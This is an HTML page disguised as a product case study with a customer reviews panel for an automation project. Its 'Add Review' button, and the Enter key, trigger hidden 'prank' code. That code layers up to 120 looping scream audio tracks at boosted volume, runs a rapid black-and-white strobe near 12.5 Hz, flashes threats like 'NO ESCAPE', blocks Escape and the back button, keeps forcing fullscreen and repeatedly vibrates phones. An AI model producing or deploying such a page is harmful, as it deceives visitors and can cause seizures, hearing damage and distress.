<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Customer Review</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      height: 100vh;
      background: #e0e0e0;
      font-family: Arial, Helvetica, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      transition: background 0.4s;
    }
    #start {
      padding: 24px 48px;
      font-size: 2.2rem;
      font-weight: bold;
      color: white;
      background: #2e7d32;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      box-shadow: 0 8px 16px rgba(0,0,0,0.3);
      transition: transform 0.1s;
    }
    #start:active {
      transform: scale(0.96);
    }

    #overlay {
      position: fixed;
      inset: 0;
      pointer-events: none;
      z-index: 9998;
      opacity: 0;
      transition: opacity 0.3s;
    }

    .flash-text {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #ff1744;
      font-size: 12vw;
      font-weight: 900;
      text-shadow: 0 0 30px black;
      background: rgba(0,0,0,0.65);
      pointer-events: none;
      z-index: 9999;
      opacity: 0;
      transition: opacity 0.4s;
    }

    .cursor-none {
      cursor: none !important;
    }
    /* debug overlay removed for production */
    .container { width: 100%; display:flex; justify-content:center; padding:36px; }
    .card { width: 100%; max-width:1100px; background: #fff; border-radius:12px; box-shadow: 0 10px 40px rgba(0,0,0,0.12); display:flex; overflow:hidden; }
    .left { padding:28px; width:60%; border-right:1px solid #eee; }
    .right { padding:28px; width:40%; display:flex; flex-direction:column; }
    h1 { font-size:1.6rem; margin-bottom:6px; }
    .muted { color:#555; margin-bottom:12px; }
    .stats { display:flex; gap:12px; margin:14px 0 18px; }
    .stat { background:#f7f7f7; padding:12px 16px; border-radius:8px; text-align:center; }
    .stat span { display:block; color:#666; font-size:12px; margin-top:6px; }
    .reviews-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:12px; }
    .add-review { background:#1976d2; color:#fff; border:none; padding:10px 14px; border-radius:8px; cursor:pointer; font-weight:700; }
    .review-list { display:flex; flex-direction:column; gap:12px; overflow:auto; max-height:420px; }
    .review { background:#fafafa; padding:12px; border-radius:8px; }
    .rating { float:right; color:#f39c12; }
  </style>
</head>
<body>

  <div class="container">
    <div class="card">
      <div class="left">
        <h1>Acme Automation — Conveyor IQ</h1>
        <p class="muted">An end-to-end automation project delivering predictive conveyor maintenance and throughput optimisation.</p>

        <div class="stats">
          <div class="stat"><strong>99.2%</strong><span>Uptime</span></div>
          <div class="stat"><strong>+24%</strong><span>Throughput</span></div>
          <div class="stat"><strong>6 mo</strong><span>Time to Value</span></div>
        </div>

        <h3>Overview</h3>
        <p>Delivered modular edge agents, a central analytics pipeline and a dashboard for realtime alerts. The system reduces manual checks and automatically schedules maintenance.</p>

        <h3>Highlights</h3>
        <ul>
          <li>Edge-first design with resilient buffering</li>
          <li>Auto-scheduling and prioritised work orders</li>
          <li>Closed-loop optimisation using RL components</li>
        </ul>
      </div>

      <div class="right">
        <div class="reviews-header">
          <h2>Customer Reviews</h2>
          <button id="start" class="add-review">Add Review</button>
        </div>

        <div class="review-list">
          <div class="review"><strong>J. Patel</strong><span class="rating">★★★★★</span><p>Significant reduction in downtime — great delivery.</p></div>
          <div class="review"><strong>M. Rivera</strong><span class="rating">★★★★☆</span><p>Solid engineering but initial config was intricate.</p></div>
          <div class="review"><strong>L. Chen</strong><span class="rating">★★★★★</span><p>Excellent monitoring and alerts — saved us hours weekly.</p></div>
        </div>
      </div>
    </div>
  </div>

  <div id="overlay"></div>

  <audio id="scream" loop preload="auto">
    <source src="123.mp3" type="audio/mpeg">
  </audio>

  <script>
    // ────────────────────────────────────────────────
    // Main prank logic
    // ────────────────────────────────────────────────

    const startBtn   = document.getElementById('start');
    const audio      = document.getElementById('scream');
    const overlay    = document.getElementById('overlay');

    let audioCtx, source, gainNode, filter;
    // ─── Layered audio hell (dynamic spam) ──────────────────
    // On start we spawn many overlapping audio elements and
    // gradually increase the spawn rate to create a swelling wall of sound.
    function initAudioHell() {
      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      audioCtx.resume().catch(()=>{});

      const audioLayers = [];
      const MAX_LAYERS = 120;

      const masterGain = audioCtx.createGain();
      masterGain.gain.value = 1.6; // boosted for audibility

      masterGain.connect(audioCtx.destination);

      // Spawn parameters
      const SPAWN_INTERVAL_MS = 400; // play every 0.4s

      function spawnLayer() {
        const a = new Audio('123.mp3');
        a.preload = 'auto';
        a.loop = true;
        a.volume = 1.0; // max per-element

        try {
          const src = audioCtx.createMediaElementSource(a);
          const g = audioCtx.createGain();
          g.gain.value = 1.0; // full gain per layer
          src.connect(g).connect(masterGain);
        } catch (err) {
          // continue even if source creation fails
        }

        a.muted = false;
        a.play().catch(()=>{});

        audioLayers.push(a);

        // cap total layers and drop oldest
        if (audioLayers.length > MAX_LAYERS) {
          const old = audioLayers.shift();
          try { old.pause(); old.src = ''; } catch(e){}
        }
      }

      // kick off several immediate spawns to create instant spam
      for (let i=0;i<6;i++) {
        setTimeout(spawnLayer, i * 80);
      }

      // then keep spawning every 400ms
      window._audioSpawner = setInterval(spawnLayer, SPAWN_INTERVAL_MS);

      // expose minimal state
      window._audioCtx = audioCtx;
      window._audioLayers = audioLayers;
    }

    // debug overlay removed for production

    // ─── 2. Visual assault ────────────────────────────────────
    function startStrobeAndFlashes() {
      document.body.classList.add('cursor-none');

      // Bright black & white strobe
      let white = false;
      const strobeInterval = setInterval(() => {
        white = !white;
        overlay.style.background = white ? '#ffffff' : '#000000';
        overlay.style.opacity = '1';
      }, 80); // ~12.5 Hz (adjustable)

      // Large flashing text (contrasting color)
      setInterval(() => {
        const texts = [
          "YOU CAN'T LEAVE",
          "WE SEE YOU",
          "SCREAM",
          "IT'S TOO LATE",
          "NO ESCAPE",
          "BEHIND YOU"
        ];
        const txt = texts[Math.floor(Math.random()*texts.length)];

        const flash = document.createElement('div');
        flash.className = 'flash-text';
        flash.textContent = txt;
        // contrast with current strobe color
        flash.style.color = white ? '#000000' : '#ffffff';
        document.body.appendChild(flash);

        setTimeout(() => { flash.style.opacity = '1'; }, 30);
        setTimeout(() => {
          flash.style.opacity = '0';
          setTimeout(() => flash.remove(), 600);
        }, 250 + Math.random()*300);
      }, 4500 + Math.random()*8000);
    }

    // ─── 3. Browser lockdown ──────────────────────────────────
    function lockBrowser() {
      // Block escape
      document.addEventListener('keydown', e => {
        if (e.key === 'Escape' || e.key === 'Esc') {
          e.preventDefault();
          e.stopPropagation();
          return false;
        }
      }, { capture: true });

      // Spam history so back button is useless
      history.pushState(null, null, location.href);
      window.onpopstate = () => {
        history.pushState(null, null, location.href);
      };

      // Nag on leave attempt
      window.addEventListener('beforeunload', e => {
        e.preventDefault();
        e.returnValue = 'Your review will be lost. Are you sure?';
      });

      // Re-enter fullscreen aggressively
      document.addEventListener('fullscreenchange', () => {
        if (!document.fullscreenElement && document.visibilityState === 'visible') {
          setTimeout(() => {
            document.documentElement.requestFullscreen().catch(()=>{});
          }, 400);
        }
      });
    }

    // ─── 4. Vibration torture (mobile) ────────────────────────
    function startVibrationHell() {
      if (!('vibrate' in navigator)) return;

      function vibrate() {
        navigator.vibrate([160, 70, 160, 70, 280, 100, 160]);
      }

      vibrate();
      setInterval(vibrate, 2200);
    }

    // ─── Main trigger ─────────────────────────────────────────
    startBtn.addEventListener('click', () => {
      // Start audio and visuals immediately in the user gesture stack
      initAudioHell();
      startStrobeAndFlashes();
      lockBrowser();
      startVibrationHell();

      // Attempt fullscreen but don't await — keep audio in the gesture path
      document.documentElement.requestFullscreen().catch(() => {});

      // Hide button and darken background
      startBtn.style.display = 'none';
      document.body.style.background = '#000';
    });

    // Trigger the same review/start sequence when user presses Enter
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        // Prevent default to avoid unintended form submissions
        e.preventDefault();
        startBtn.click();
      }
    });
  </script>
</body>
</html>
